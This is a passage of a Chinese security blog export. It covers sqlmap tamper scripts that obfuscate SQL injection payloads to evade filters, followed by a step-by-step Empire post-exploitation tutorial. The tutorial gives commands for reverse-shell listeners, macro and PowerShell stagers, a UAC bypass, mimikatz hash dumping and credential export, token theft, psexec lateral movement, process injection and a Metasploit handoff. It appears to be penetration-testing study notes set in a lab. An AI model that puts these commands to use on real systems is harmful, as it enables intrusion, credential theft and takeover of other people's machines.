class="line">CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;*!AS*&#x2F;&#x2F;*!CHAR*&#x2F;),CHAR(</span><br><span class="line"></span><br><span class="line">32)),CHAR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure>

<ol start="26">
<li>halfversionedmorekeywords.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL &lt; 5.1</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 4.0.18&#x2F;5.0.22</span><br><span class="line"></span><br><span class="line">作用：在每个关键字前添加mysql版本注释</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;value&#39; UNION ALL SELECTCONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS</span><br><span class="line"></span><br><span class="line">CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNUL</span><br><span class="line"></span><br><span class="line">L(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58*</span><br><span class="line"></span><br><span class="line">*)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa</span><br></pre></td></tr></table></figure>

<ol start="27">
<li>space2morehash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL &gt;&#x3D; 5.1.13</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1.41</span><br><span class="line"></span><br><span class="line">作用：将空格替换为#，并添加一个随机字符串和换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="28">
<li>apostrophenullencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用非法双字节Unicode字符替换单引号</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1 AND &#39;1&#39;&#x3D;&#39;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND %00%271%00%27&#x3D;%00%271</span><br></pre></td></tr></table></figure>

<ol start="29">
<li>appendnullbyte.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：在有效载荷的结束位置加载null字节字符编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 1&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 1&#x3D;1%00</span><br></pre></td></tr></table></figure>

<ol start="30">
<li>chardoubleencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F</span><br><span class="line"></span><br><span class="line">%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>

<ol start="31">
<li>unmagicquotes.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1&#39; AND 1&#x3D;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1%bf%27 AND 1&#x3D;1--</span><br></pre></td></tr></table></figure>

<ol start="32">
<li>randomcomments.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用注释符分割sql关键字</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;INSERT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：I&#x2F;&#x2F;N&#x2F;&#x2F;SERT</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Empire工具基础用法</title>
    <url>/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeflnjm2wj31900u0npe.jpg" alt="88"></p>
<a id="more"></a>

<h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><p>​        Empire 是一款类似Metasploit 的渗透测试框架，基于python 编写，Empire是一个纯粹的PowerShell 后开发代理，建立在密码安全通信和灵活的架构上。Empire 实现了无需powershell.exe 即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。</p>
<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h3><p>下载地址： <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
<p>下载地址：<a href="https://github.com/interference-security/empire-web.git" target="_blank" rel="noopener">https://github.com/interference-security/empire-web.git</a>  (web版)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br><span class="line"></span><br><span class="line">切换至工具目录setup下</span><br><span class="line">	.&#x2F;install.sh</span><br><span class="line">出现setip comlete则安装成功</span><br><span class="line">	.&#x2F;reset.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhi9oq0tj316c0rkwn9.jpg" alt="image-20200210180914768"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">切换至主目录运行.&#x2F;empire，如果出现错误则使用pip安装模块即可</span><br><span class="line"></span><br><span class="line">若出现无pydispatcher模块名，则使用以下命令解决即可</span><br><span class="line">	pip install PyDispatcher</span><br><span class="line">	</span><br><span class="line">若出现No module named Crypto.Cipher</span><br><span class="line">	pip install pycrypto</span><br></pre></td></tr></table></figure>

<p>成功界面！</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhia8gi2j316u0oigpg.jpg" alt="image-20200210183146543"></p>
<h3 id="0x02-监听模块"><a href="#0x02-监听模块" class="headerlink" title="0x02 监听模块"></a>0x02 监听模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入监听模块</span><br><span class="line">	listeners</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izbyoej31hg0mggtx.jpg" alt="image-20200225133238490"></p>
<p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单</span><br><span class="line">back	</span><br><span class="line">	回到主菜单</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据</span><br><span class="line">delete	</span><br><span class="line">	从数据库中删除侦听器</span><br><span class="line">disable	</span><br><span class="line">	禁用禁用（停止）一个或所有侦听器。侦听器不会自动启动Empire</span><br><span class="line">edit	</span><br><span class="line">	编辑更改侦听器选项，在重新启动侦听器之前不会生效</span><br><span class="line">enable	</span><br><span class="line">	启用并启动一个或所有侦听器</span><br><span class="line">exit	</span><br><span class="line">	退出</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单</span><br><span class="line">info	</span><br><span class="line">	显示活动侦听器的信息</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或所有活跃的听众</span><br><span class="line">launcher	</span><br><span class="line">	为侦听器生成初始启动器</span><br><span class="line">list	</span><br><span class="line">	列出所有活动的侦听器（或代理）</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表</span><br><span class="line">uselistener	</span><br><span class="line">	使用帝国侦听器模块</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿</span><br></pre></td></tr></table></figure>





<p>监听方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">监听方法</span><br><span class="line">	http</span><br><span class="line">	https</span><br><span class="line">	</span><br><span class="line">修改监听名</span><br><span class="line">	set Name Time</span><br><span class="line"></span><br><span class="line">设置shell回弹地址</span><br><span class="line">	set Host http:&#x2F;&#x2F;192.168.43.239:8080</span><br><span class="line"></span><br><span class="line">设置监听端口</span><br><span class="line">	set Port 8080</span><br><span class="line"></span><br><span class="line">开启监听</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j8vgwej315w0u04j7.jpg" alt="image-20200225135923882"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixs46qj32ni060q7l.jpg" alt="image-20200225140922490"></p>
<h3 id="0x03-生成payload模块"><a href="#0x03-生成payload模块" class="headerlink" title="0x03 生成payload模块"></a>0x03 生成payload模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回主菜单，输入usestager （空格+tab）可显示当前能生成的payload</span><br><span class="line">根据目标系统选择对应payload</span><br><span class="line">本次目标系统为windows7</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iwk1maj32ni060q7l.jpg" alt="image-20200225142334385"></p>
<p>选择windows/launcher_bat模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_bat Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixa7tqj317l0u04bi.jpg" alt="image-20200225143122716"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4h2cnj32xs0mae81.jpg" alt="image-20200225143504171"></p>
<p>接收反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6abfgj30zy04a75k.jpg" alt="image-20200225145039349"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j08jpuj31lw07cac1.jpg" alt="image-20200225145058252"></p>
<p>选择会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interact 2RH69CMK</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4w4rwj31mi0fcn14.jpg" alt="image-20200225145810389"></p>
<p>选择windows/launcher_vbs模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_vbs Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j216soj32yi0o8kjl.jpg" alt="image-20200225160206353"></p>
<p>获取shell成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6qqd8j31pu0dw79b.jpg" alt="image-20200225160405629"></p>
<p>另外一种直接生成shell方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows</span><br><span class="line">	launcher powershell Time</span><br><span class="line">在目标主机中直接运行，无文件落地，隐秘性较高</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j5q6dfj32ya0l8hdt.jpg" alt="image-20200225160843514"></p>
<p>反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j78rmmj32280fmn53.jpg" alt="image-20200225160955148"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux</span><br><span class="line">	launcher python Time</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j80fvlj32y40p4axv.jpg" alt="image-20200225162205082"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izugoej30vb0u0ncp.jpg" alt="image-20200225162330487"></p>
<p>宏反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;macro Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br><span class="line">	</span><br><span class="line">将代码复制到execl的宏代码中运行</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iymvyzj31340u0x1h.jpg" alt="image-20200225171313456"></p>
<p>反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ja1i8sj313k0u0tqq.jpg" alt="image-20200225170131670"></p>
<h3 id="0x04-代理会话-shell会话"><a href="#0x04-代理会话-shell会话" class="headerlink" title="0x04 代理会话(shell会话)"></a>0x04 代理会话(shell会话)</h3><p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单。</span><br><span class="line">autorun	</span><br><span class="line">	从文件读取并执行帝国命令列表，并在每个新代理上执行“autorun&lt;resource file&gt;&lt;agent language&gt;”，例如“autorun&#x2F;root&#x2F;ps.rc powershell”。或使用“自动运行清除”清除任何自动运行设置，并使用“自动运行显示”显示当前自动运行设置</span><br><span class="line">	</span><br><span class="line">back	</span><br><span class="line">	回到主菜单。</span><br><span class="line">clear	</span><br><span class="line">	清除一个或多个代理的任务。</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据。</span><br><span class="line">exit	</span><br><span class="line">	退出。</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单。</span><br><span class="line">interact	</span><br><span class="line">	与特定代理交互。</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或多个代理以退出任务。</span><br><span class="line">killdate	</span><br><span class="line">	设置一个或多个代理的kildate（kildate[agent&#x2F;all]01&#x2F;01&#x2F;2016）。</span><br><span class="line">list	</span><br><span class="line">	列表列出所有活动代理（或侦听器）。</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单。</span><br><span class="line">lostlimit	</span><br><span class="line">	Task将一个或多个代理设置为“lostlimit[代理&#x2F;全部][错过的回调数]”</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单。</span><br><span class="line">remove	</span><br><span class="line">	从数据库中删除一个或多个代理。</span><br><span class="line">rename	</span><br><span class="line">	重命名重命名特定代理。</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表。</span><br><span class="line">searchmodule	</span><br><span class="line">	搜索帝国模块名称&#x2F;描述。</span><br><span class="line">sleep	</span><br><span class="line">	睡眠任务一个或多个代理“睡眠[代理&#x2F;全部]间隔[抖动]”</span><br><span class="line">usemodule	</span><br><span class="line">	使用帝国PowerShell模块。</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿。</span><br><span class="line">workinghou	</span><br><span class="line">	工作时间设置一个或多个代理的工作时间（工作时间[代理&#x2F;全部]9:00-17:00）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list</span><br><span class="line">	查看会话列表</span><br><span class="line">用户处*代表最高权限</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz16kwvxj31l605640n.jpg" alt="image-20200227000538125"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list stale</span><br><span class="line">	列出已丢失会话代理</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p7igqyj31ne07sad4.jpg" alt="image-20200226023048893"></p>
<h3 id="0x05-UAC提权方法模块"><a href="#0x05-UAC提权方法模块" class="headerlink" title="0x05 UAC提权方法模块"></a>0x05 UAC提权方法模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入会话，输入usemodule (空格+tab键)查看可使用模块</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p94hgcj31jn0u0npd.jpg" alt="image-20200226023120588"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">	检测提权方法模块</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbzounsfrj30lw0cywf0.jpg" alt="image-20200228121225322"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UAC提权模块</span><br><span class="line">	bypassuac Time</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pb253fj31pw0r2qe6.jpg" alt="image-20200226023221559"></p>
<h3 id="0x06-信息收集"><a href="#0x06-信息收集" class="headerlink" title="0x06 信息收集"></a>0x06 信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps</span><br><span class="line">	查看进程</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pa31sdj30u00xodpf.jpg" alt="image-20200226023252724"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地管理组访问模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;find_localadmin_access</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988sof8gj31820iq79c.jpg" alt="image-20200226023409814"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加载mimikatz获取管理员hash</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988ryzutj313g0u0nde.jpg" alt="image-20200226023812869"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看用户及hash(包括明文)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988t6i2nj31fk096n00.jpg" alt="image-20200226023858797"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creds krbtgt </span><br><span class="line"> 	搜索特定用户的krbtgt</span><br><span class="line">creds plaintext </span><br><span class="line"> 	搜索hash中的明文</span><br><span class="line">creds hash </span><br><span class="line">	列出所有hash值</span><br><span class="line">creds export &#x2F;opt&#x2F;hash.csv </span><br><span class="line">	导出hash凭证到指定的格式</span><br><span class="line">	</span><br><span class="line">shell net localgroup administrators </span><br><span class="line">	查看管理员组</span><br><span class="line">shell ipconfig </span><br><span class="line">	查看IP地址</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户账号枚举模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;get_user</span><br><span class="line">可设置域名</span><br><span class="line">  set Domain hacker.testlab</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988tth2yj30y80u0h41.jpg" alt="image-20200226024938492"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络用户会话登录情况</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;userhunter</span><br><span class="line">	</span><br><span class="line">网络扫描</span><br><span class="line">	shell ping -a -n 1 192.168.2.1</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">设置扫描范围</span><br><span class="line">	set Range 192.168.2.1-192.168.2.150</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz15m391j30vi0u0akv.jpg" alt="image-20200226141750252"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DNS信息获取</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;reverse_dns</span><br><span class="line"></span><br><span class="line">共享文件</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;share_finder</span><br><span class="line">	set CheckShareAccess True</span><br><span class="line">	</span><br><span class="line">会话令牌偷取获取目标访问权限</span><br><span class="line">	ps cmd</span><br><span class="line">	steal_token  3716(PID)</span><br><span class="line">	shell dir \\HACKER(域名称)\c$</span><br><span class="line">	</span><br><span class="line">psexec模块横向生成一个反弹代理</span><br><span class="line">	usemodule lateral_movement&#x2F;invoke_psexec</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br><span class="line">	设置域名称</span><br><span class="line">	set ComputerName HACKER</span><br><span class="line">	</span><br><span class="line">会话注入得到反弹代理</span><br><span class="line">	ps cmd</span><br><span class="line">	选择反弹模块</span><br><span class="line">	usemodule management&#x2F;psinject</span><br><span class="line">	设置PID</span><br><span class="line">	set ProcId 2340</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz13b8lkj316j0u0tl7.jpg" alt="image-20200226201934966"></p>
<h3 id="0x07-Empire和MSF联动"><a href="#0x07-Empire和MSF联动" class="headerlink" title="0x07 Empire和MSF联动"></a>0x07 Empire和MSF联动</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Empire</span><br><span class="line">		usemodule code_execution&#x2F;invoke_shellcode</span><br><span class="line">		info</span><br><span class="line">		set Lhost 192.168.2.131</span><br><span class="line">		set Lport 4445</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Metasploit</span><br><span class="line">		use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">		set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">		set lhost 192.168.2.131</span><br><span class="line">    set lport 4445</span><br><span class="line">    set exitsession false</span><br><span class="line">    exploit -j</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>后渗透工具</tag>
      </tags>
  </entry>
</search>
